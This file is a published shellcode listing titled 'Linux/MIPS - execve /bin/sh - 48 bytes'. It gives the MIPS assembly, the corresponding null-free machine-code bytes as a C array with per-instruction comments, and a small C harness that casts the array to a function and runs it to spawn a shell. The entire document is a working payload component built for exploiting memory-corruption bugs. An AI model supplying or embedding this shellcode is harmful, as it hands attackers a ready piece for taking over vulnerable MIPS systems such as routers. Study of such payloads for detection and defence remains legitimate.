/* Title:  Linux/MIPS - execve /bin/sh - 48 bytes
   Date:   2011-11-24
   Author: rigan - imrigan [at] gmail.com

        .text
        .global __start
__start:
        slti $a2, $zero, -1
        li $t7, 0x2f2f6269
        sw $t7, -12($sp)
        li $t6, 0x6e2f7368
        sw $t6, -8($sp)
        sw $zero, -4($sp)
        la $a0, -12($sp)
        slti $a1, $zero, -1
        li $v0, 4011
        syscall 0x40404
*/

#include <stdio.h>


char sc[] = {
        "\x28\x06\xff\xff"        /* slti    a2,zero,-1   */
        "\x3c\x0f\x2f\x2f"        /* lui     t7,0x2f2f    */
        "\x35\xef\x62\x69"        /* ori     t7,t7,0x6269 */
        "\xaf\xaf\xff\xf4"        /* sw      t7,-12(sp)   */
        "\x3c\x0e\x6e\x2f"        /* lui     t6,0x6e2f    */
        "\x35\xce\x73\x68"        /* ori     t6,t6,0x7368 */
        "\xaf\xae\xff\xf8"        /* sw      t6,-8(sp)    */
        "\xaf\xa0\xff\xfc"        /* sw      zero,-4(sp)  */
        "\x27\xa4\xff\xf4"        /* addiu   a0,sp,-12    */
        "\x28\x05\xff\xff"        /* slti    a1,zero,-1   */
        "\x24\x02\x0f\xab"        /* li      v0,4011      */
        "\x01\x01\x01\x0c"        /* syscall 0x40404      */
};

void main(void)
{
       void(*s)(void);
       printf("size: %d\n", strlen(sc));
       s = sc;
       s();
}